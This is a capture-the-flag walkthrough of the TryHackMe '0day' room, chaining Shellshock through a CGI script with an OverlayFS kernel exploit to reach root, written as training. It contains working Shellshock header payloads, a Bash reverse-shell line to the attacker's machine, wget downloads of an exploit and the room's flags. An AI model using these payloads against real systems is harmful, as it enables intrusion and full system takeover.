
# TryHackMe — 0day Walkthrough

**Platform:** TryHackMe  
**Room:** [0day](https://tryhackme.com/room/0day)  
**Target OS:** Ubuntu 14.04.1 LTS  
**Difficulty:** Medium  
**Status:** Root access achieved

---

## 1. Introduction

This write-up documents my process of completing the TryHackMe **0day** room.

I started by scanning the target machine, enumerated its web directories, discovered a vulnerable CGI script, exploited Shellshock to gain a reverse shell, and then used a Linux kernel vulnerability to escalate privileges from `www-data` to `root`.

During the process, I encountered several errors involving command syntax, file transfers, GCC, and glibc compatibility.

This write-up covers the actual steps I performed and how I resolved those issues.

### Attack Summary

| Stage | Result |
|---|---|
| Reconnaissance | Discovered SSH and HTTP |
| Directory enumeration | Discovered `/cgi-bin/test.cgi` |
| Initial access | Shellshock (CVE-2014-6271) |
| Reverse shell | Access as `www-data` |
| User flag | Found in `/home/ryan/user.txt` |
| Privilege escalation | OverlayFS (CVE-2015-1328) |
| Root access | Successfully obtained `uid=0(root)` |

---

## 2. Lab Environment

I used the TryHackMe AttackBox to attack the deployed lab machine.

| Machine | IP Address |
|---|---|
| AttackBox | `10.113.80.72` |
| Target | `10.113.182.103` |

The IP addresses shown here were assigned during my lab session.

---

## 3. Reconnaissance

### Nmap Scan

I started by scanning the target for service versions.

```bash
nmap -sV 10.113.182.103
```

The scan identified two open ports:

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP |

Since port 80 was open, I decided to investigate the web server.

### Web Directory Enumeration

I used Gobuster with the `common.txt` wordlist.

```bash
gobuster dir -u http://10.113.182.103/ -w /usr/share/wordlists/dirb/common.txt
```

Relevant results:

```text
/admin         (Status: 301)
/backup        (Status: 301)
/cgi-bin       (Status: 301)
/cgi-bin/      (Status: 403)
/index.html    (Status: 200)
/robots.txt    (Status: 200)
/secret        (Status: 301)
/uploads       (Status: 301)
```

The `/cgi-bin/` directory was especially interesting because CGI scripts can execute server-side programs.

Although the directory returned `403 Forbidden`, that did not necessarily mean individual scripts inside it were inaccessible.

---

## 4. Investigating the Web Directories

### robots.txt

I checked the robots file:

```bash
curl http://10.113.182.103/robots.txt
```

Response:

```text
You really thought it'd be this easy?
```

The response did not reveal a useful path.

### Backup Directory

Initially, requesting `/backup` returned an HTTP 301 redirect.

I then requested the directory with the trailing slash:

```bash
curl http://10.113.182.103/backup/
```

The server returned an encrypted RSA private key, beginning with:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
```

I did not use this key to gain access to the target.

### Secret Directory

I also checked:

```bash
curl http://10.113.182.103/secret/
```

Response:

```html
<html>
<head>
<title>Turtles?</title>
</head>
<body>
<center><img src="turtle.png"></center>
</body>
</html>
```

I continued investigating the CGI directory.

---

## 5. Discovering the CGI Script

I initially ran Gobuster with file extensions against the website root.

After realizing that I needed to enumerate `/cgi-bin/` specifically, I used:

```bash
gobuster dir -u http://10.113.182.103/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl,py
```

The important result was:

```text
/test.cgi (Status: 200) [Size: 13]
```

This confirmed that `/cgi-bin/test.cgi` was accessible.

I checked the script using Curl:

```bash
curl -i http://10.113.182.103/cgi-bin/test.cgi
```

Response:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.7 (Ubuntu)
Content-Length: 13
Content-Type: text/html

Hello World!
```

The endpoint returned a simple `Hello World!` response.

---

## 6. Testing for Shellshock

I investigated whether the CGI endpoint was vulnerable to Shellshock (CVE-2014-6271).

Shellshock is a vulnerability in Bash that can allow commands to execute when specially crafted environment-variable values are processed.

I tested the CGI script by injecting a command into the HTTP `User-Agent` header.

```bash
curl -i -H 'User-Agent: () { :; }; echo; echo shellshock_test ' http://10.113.182.103/cgi-bin/test.cgi
```

The server responded:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.7 (Ubuntu)
Transfer-Encoding: chunked

shellshock_test
Content-type: text/html

Hello World!
```

The appearance of `shellshock_test` confirmed that the injected command had executed.

### Confirming Remote Code Execution

I then executed `whoami` through the same header.

```bash
curl -i -H 'User-Agent: () { :; }; echo; /usr/bin/whoami ' http://10.113.182.103/cgi-bin/test.cgi
```

Output:

```text
www-data
```

This confirmed that I could execute commands on the target as the Apache web server user, `www-data`.

---

## 7. Obtaining a Reverse Shell

After confirming command execution, I moved on to obtaining an interactive shell.

### Starting a Netcat Listener

On my AttackBox, I started a listener on port 4444.

```bash
nc -lvnp 4444
```

Output:

```text
Listening on 0.0.0.0 4444
```

I used the Shellshock vulnerability to make the target initiate a Bash reverse-shell connection back to my AttackBox.

The Bash reverse-shell command used the following connection:

```bash
bash -i >& /dev/tcp/10.113.80.72/4444 0>&1
```

My Netcat listener received the connection:

```text
Connection received on 10.113.182.103 39789
bash: cannot set terminal process group (868): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$
```

I verified access using:

```bash
whoami
id
hostname
```

Output:

```text
www-data

uid=33(www-data) gid=33(www-data) groups=33(www-data)

ubuntu
```

I now had a reverse shell on the target as `www-data`.

---

## 8. Enumerating the Target System

I started by inspecting my current directory.

```bash
pwd
ls -la
```

Output:

```text
/usr/lib/cgi-bin

total 12
drwxr-xr-x  2 root root 4096 Sep  2  2020 .
drwxr-xr-x 54 root root 4096 Sep  2  2020 ..
-rwxr-xr-x  1 root root   73 Sep  2  2020 test.cgi
```

This confirmed the CGI script's location.

### Checking Home Directories

I ran:

```bash
ls -la /home
```

Output included:

```text
lrwxrwxrwx 1 root root   14 Sep  2  2020 .secret -> /root/root.txt
drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 ryan
```

I discovered a home directory belonging to `ryan`.

I inspected it:

```bash
ls -la /home/ryan
```

Relevant output:

```text
-rw-rw-r-- 1 ryan ryan 22 Sep 2 2020 user.txt
```

The file was readable by my current user because of its permissions.

### Retrieving the User Flag

I executed:

```bash
cat /home/ryan/user.txt
```

Output:

```text
THM{Sh3llSh0ck_r0ckz}
```

**User flag successfully obtained.**

![User flag](images/user-flag.png)

---

## 9. Identifying the Linux Kernel

I checked the target's kernel version.

```bash
uname -a
```

Output:

```text
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

I also checked the operating system:

```bash
cat /etc/os-release
```

Relevant output:

```text
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
```

The machine was running Ubuntu 14.04.1 LTS with kernel `3.13.0-32-generic`.

I investigated privilege-escalation exploits affecting this older kernel.

---

## 10. Finding the OverlayFS Exploit

On my AttackBox, I searched Searchsploit.

```bash
searchsploit overlayfs ubuntu 14.04
```

The results included:

```text
Linux Kernel 3.13.0 < 3.19 ... | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 ... | linux/local/37293.txt
Linux Kernel 4.3.3 ...         | linux/local/39166.c
Ubuntu 14.04/15.10 ...        | linux/local/41762.txt
```

I selected:

```text
linux/local/37292.c
```

This exploit targets the OverlayFS vulnerability **CVE-2015-1328**.

I examined the exploit source using Searchsploit.

```bash
searchsploit -x 37292
```

The source identified the exploit as an OverlayFS local root exploit affecting older Ubuntu releases.

I copied the exploit source onto my AttackBox:

```bash
searchsploit -m 37292
```

---

## 11. Transferring the Exploit

I used a Python HTTP server on my AttackBox to transfer the exploit to the target.

```bash
python3 -m http.server 8000
```

On the target, I initially attempted:

```bash
cd /tmp
wget http://10.113.80.72:8000/37292.c
```

The first attempt failed:

```text
HTTP request sent, awaiting response... 404 File not found
```

The target could connect to the AttackBox, but the server could not find the requested file.

After correcting the file location on my AttackBox, I repeated the download.

```bash
wget http://10.113.80.72:8000/37292.c
```

This time it worked:

```text
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/plain]
Saving to: '37292.c'

'37292.c' saved [4968/4968]
```

I verified the file:

```bash
ls -l 37292.c
```

Output:

```text
-rw-r--r-- 1 www-data www-data 4968 Nov 10 23:54 37292.c
```

---

## 12. Troubleshooting GCC

I attempted to compile the exploit on the target.

```bash
gcc 37292.c -o ofs
```

This failed:

```text
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

GCC was unable to execute its internal compiler component, `cc1`.

### Attempting Compilation on the AttackBox

I tried compiling the exploit on my AttackBox instead.

```bash
gcc -m64 37292.c -o ofs
```

The compilation produced warnings about implicit declarations of functions including:

```text
unshare
clone
waitpid
wait
```

However, an executable was created.

I transferred this binary to the target.

```bash
wget http://10.113.80.72:8000/ofs
chmod +x ofs
```

The download succeeded.

```text
Length: 16848 (16K) [application/octet-stream]
Saving to: 'ofs'

'ofs' saved [16848/16848]
```

I verified the file:

```bash
ls -lh ofs
```

Output:

```text
-rwxr-xr-x 1 www-data www-data 17K Nov 10 23:59 ofs
```

### glibc Compatibility Error

When I executed the binary:

```bash
./ofs
```

I received:

```text
./ofs: /lib/x86_64-linux-gnu/libc.so.6:
version `GLIBC_2.34' not found (required by ./ofs)
```

The executable built on my AttackBox required a newer glibc version than the target provided.

I needed to compile the exploit using the target's older environment instead.

---

## 13. Fixing the Compiler Environment

Back on the target, I set the `PATH` environment variable explicitly:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

This made the necessary compiler tools accessible.

I then compiled the source again, directly on the target:

```bash
gcc 37292.c -o ofs
```

This time, the compilation completed without displaying an error.

The executable was now built for the target's environment.

---

## 14. Privilege Escalation to Root

I executed the locally compiled exploit:

```bash
./ofs
```

Output:

```text
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
#
```

The `#` prompt suggested that the exploit had spawned a privileged shell.

I verified this using:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

I also executed:

```bash
whoami
```

Output:

```text
root
```

**Privilege escalation was successful.**

I had escalated from `www-data` to `root` using the OverlayFS vulnerability.

---

## 15. Retrieving the Root Flag

After obtaining root privileges, I read the root flag:

```bash
cat /root/root.txt
```

Output:

```text
THM{g00d_j0b_0day_is_Pleased}
```

**Root flag successfully obtained.**

![Root access and root flag](images/root-access.png)

---

## 16. Challenges and Lessons Learned

During this room, I encountered several problems.

| Problem | What I learned |
|---|---|
| Incorrect Gobuster syntax | Command-line flags and spacing matter |
| Gobuster scanning the wrong directory | Enumeration must target the correct location |
| HTTP 301 redirects | Some directory URLs require a trailing slash |
| HTTP 403 on `/cgi-bin/` | A forbidden directory does not mean its scripts are inaccessible |
| HTTP 404 during exploit transfer | Verify the HTTP server's working directory |
| GCC `cc1` error | Compiler execution can depend on environment configuration |
| `GLIBC_2.34 not found` | Binaries built on newer systems may not run on older systems |
| Shell access as `www-data` | Initial access does not automatically grant root privileges |

The most important lesson was that exploitation is not always straightforward.

I had to troubleshoot several different issues before reaching root access.

---

## 17. Attack Chain Summary

```text
Nmap
  |
  v
Ports 22 and 80 discovered
  |
  v
Gobuster directory enumeration
  |
  v
/cgi-bin/test.cgi discovered
  |
  v
Shellshock (CVE-2014-6271)
  |
  v
Remote command execution
  |
  v
Reverse shell as www-data
  |
  v
/home/ryan/user.txt
  |
  v
Kernel enumeration
  |
  v
Ubuntu 14.04.1 / Kernel 3.13.0-32
  |
  v
OverlayFS (CVE-2015-1328)
  |
  v
Root shell (uid=0)
  |
  v
/root/root.txt
```

---

## 18. Conclusion

I successfully completed the TryHackMe **0day** room.

The room demonstrated how two vulnerabilities can be chained together:

1. **Shellshock (CVE-2014-6271)** allowed me to execute commands through a vulnerable CGI script and gain initial access as `www-data`.
2. **OverlayFS (CVE-2015-1328)** allowed me to escalate privileges from `www-data` to `root`.

The experience also helped me practice troubleshooting Linux command syntax, HTTP file transfers, compiler configuration, and binary compatibility issues.

### Tools I Used

- Nmap
- Gobuster
- Curl
- Netcat
- Searchsploit
- Python HTTP server
- GCC
- Wget

### References

- [TryHackMe — 0day](https://tryhackme.com/room/0day)
- [CVE-2014-6271 — Shellshock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [CVE-2015-1328 — OverlayFS](https://nvd.nist.gov/vuln/detail/CVE-2015-1328)
- [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292)

---

**Disclaimer:** This write-up documents an authorized cybersecurity training exercise conducted in the TryHackMe lab environment.
